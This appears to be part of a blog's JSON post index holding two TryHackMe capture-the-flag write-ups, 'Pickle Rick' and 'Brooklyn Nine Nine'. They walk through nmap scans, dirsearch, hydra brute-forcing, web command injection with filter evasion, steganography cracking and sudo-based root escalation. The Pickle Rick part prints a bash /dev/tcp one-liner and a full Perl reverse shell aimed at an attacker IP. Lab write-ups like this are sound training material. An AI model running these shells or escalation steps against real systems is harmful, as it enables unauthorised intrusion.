AAAAC3NzaC1lZDI1NTE5AAAAIKcg2XsRFJ0X32sAAhVOLEn/LubUccaCEVVDQV6slCHD80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Rick is sup4r cool|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 18:18Completed NSE at 18:18, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 18:18Completed NSE at 18:18, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 18:18Completed NSE at 18:18, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 26.34 secondsOkay, just ssh and http hmph‚Ä¶Straight up, I visited the site::Found nothing but a message from rick in dire need of our help to revert back to human‚Ä¶ Quickly I view the page source, always view the source! therein I find this commented out: Note to self, remember username! Username: R1ckRul3s Okay Classic rick keeping hidden reminders for himself, I try the username on port 22 and bruteforce the creds with hydra and realized it could only be 2 things: apparently Rick‚Äôs pass isn‚Äôt in a wordlist OR the acquired username is not for ssh, while hydra was still trying I resort to my go-to dir enum tool, Dirsearch!:-)fire her up and get these hidden directories: ‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Tryhackme/PickleRick]‚îî‚îÄ$ dirsearch -u 10.10.220.220 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 30 _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613Output File: /home/azazel/.dirsearch/reports/10.10.220.220_22-04-11_18-52-02.txtError Log: /home/azazel/.dirsearch/logs/errors-22-04-11_18-52-02.logTarget: http://10.10.220.220/[18:52:10] Starting: [18:52:19] 301 - 315B - /assets -&gt; http://10.10.220.220/assets/[18:52:34] 200 - 1KB - /index.html[18:52:40] 200 - 882B - /login.php[18:52:48] 200 - 17B - /robots.txt[18:52:50] 403 - 301B - /server-statusTask Completed Nothing much only interesting directory is a login page and the robots.txt, checked that out to see any pages disallowed to be crawled and Instead see Rick‚Äôs catch phrase Wub############ub Welp, we have a username and possibly a pass, but goes where exactly? Found a login page and try the creds there:And then we‚Äôre greeted with an input field which accepts commands‚ÄìCommand Injection took advantage of this and tried to find and read all the ingredients but there is some sort of input filter that prevents us from reading files with cat, tail, head but not less and find lmao! all of what we need, hehee: I could grab all the ingredients through this method but that‚Äôs no fun! and it also felt somewhat restrictive and defeats the initial access idea. Now to upload a shell!A classic Bash one liner would work::bash -c &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1but I felt like exploring other shell one liners out of curiousity I resorted to trying out Perl, grabbed a Reverse shell one liner from PentestMonkey:perl -e 'use Socket;$i=\"10.8.45.27\";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'NB:: Adjust the parameters to receive the shell, you wouldn‚Äôt to be sending me a shell, would you now?We‚Äôre in! and now to comfortably read the Sup3rS3cretPickl3Ingred.txt filewww-data@ip-10-10-60-92:/var/backups$ cat Sup3rS3cretPickl3Ingred.txtmr. ###### hairFound the second ingredient in Rick‚Äôs Home directory::www-data@ip-10-10-60-92:/home/rick$ cat second\\ ingredients1 #### tearChecking sudo permissions, only to find as compensation and horrible security, the www-data user who we are logged in as has sudo permissions to execute EVERYTHING? sheesh!www-data@ip-10-10-60-92:/home/rick$ sudo -lMatching Defaults entries for www-data on ip-10-10-60-92.eu-west-1.compute.internal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser www-data may run the following commands on ip-10-10-60-92.eu-west-1.compute.internal: (ALL : ALL) ALLTo make ourselves root and grab the last ingredient::www-data@ip-10-10-60-92:/home/rick$ sudo suroot@ip-10-10-60-92: cd /root; cat 3rd.txtAnd that‚Äôs it! We saved Rick and got to see jerry tears too ‚Äìthe joy:-)Thank you for reading.Greetings, from Rami3l." }, { "title": "Brookyln Nine Nine Writeup", "url": "/posts/Brooklyn99-Writeup/", "categories": "TryHackMe", "tags": "Misconfigured FTP, Steganography, Bruteforce", "date": "2022-04-11 00:00:00 +0100", "snippet": "Brooklyn Nine Nine walkthrough.This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box, you can check it out here: TryhackmePrefaceFirst off I am personally a huge fan of the show, (Amy is my fav character btw I‚Äôm sure yunno why lol) and It‚Äôs a quite easy one, but no worries if you‚Äôre stuck I‚Äôll walk you through buddy;) but first I‚Äôll leave hints to stimulate your mind:Hints checked source code yet?? Port 80 exists for a reason yunno? Hmph, just a picture? Bruteforcing steg?First things first, a Portscan so we know our attack surface:‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Tryhackme/Brooklyn99]‚îî‚îÄ$ nmap -sC -sV 10.10.24.94 -Pn -vv -p 1-1024 -T4 --open 21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.45.27| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz| 256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=| 256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: POST OPTIONS HEAD GET|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelPerfect, port 21, 22 and 80, ftp, ssh and http all present, lets get to it then‚Ä¶First method::Got anon logins allowed on ftp, so, swiftly I log in to ‚Äúget‚Äù the file we see from our script scan: ‚Äúnote_to_jake.txt‚Äù where Amy gives us a clear hint(See why I like her?)::‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Tryhackme/Brooklyn99]‚îî‚îÄ$ ftp 10.10.24.94Connected to 10.10.24.94.220 (vsFTPd 3.0.3)Name (10.10.24.94:azazel): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt226 Directory send OK.ftp&gt; get note_to_jake.txtlocal: note_to_jake.txt remote: note_to_jake.txt200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).226 Transfer complete.119 bytes received in 0.00 secs (378.5372 kB/s)I read the file and get the clue that Jake is using weak creds(Classic Jake),From Amy,Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nineHehee I let Hydra do his thing::Welp, Jake was not the root user and the user.txt is also not his or in his home directory, I navigated to Holt‚Äôs after searchiing Amy‚Äôs and finding nothing and found the user.txt flag,before scp‚Ä¶ing or wget‚Ä¶ing any Privesc script I like to manually check for LPE vectors apparently we have sudo permissions to use ‚Äúless‚Äù. gtfobins says we can use this for privesc like so::next::sudo less /etc/profile And append!/bin/shAnd that‚Äôs it we are root! read the root.txt file, submit the flags.Why this was fun is because it made me understand the relevance of the /etc/profile config file, it is basically a root owned file that is ran on login of any user as a child process of systemd(like all processes are) that controls system-wide default variables especially terminal type in our case scenerio, us having priviledged access to the ‚Äúless‚Äù command utility which provides a ‚Äúvim or a vim-like interface‚Äù to read files and edit binaries, and leveraging that allowed us carry out command operations within the file with the ‚Äúless‚Äù binary allowing us spawn a root shell.Second Intended MethodWon‚Äôt be posting images to display cause I forgot to document this part lol, but its pretty basic, I‚Äôll give the steps here ; Visited port 80 and checked source code which gave the clue: Have you ever head of steganography? Downloaded the image being served on port 80 through the server, Yes the seemingly unsuspecting image.Tried a few common passwords and failed swiftly and then decided to google-fu a little for tools to bruteforce a steg image and found two: stegcracker and stegseek, although stegseek is more revered due to it‚Äôs speed and is an upgrade, but I prefer stegcracker on multithread :) (this is me from the future taking back what I said here back lmao, stegseek is King) Then I used Stegcracker: sudo apt install stegcracker cat the output file, from using the pass to extract the stego image and it gives us this::Holts Password:fl#################eEnjoy!! It gives us Holts ssh creds, I log in, Holt has a different sudo permission(Nano), easy fix: used gtfobins and got root!And thats it, We hacked the nine nine mate! ;)Greetings, from Rami3l" } ]
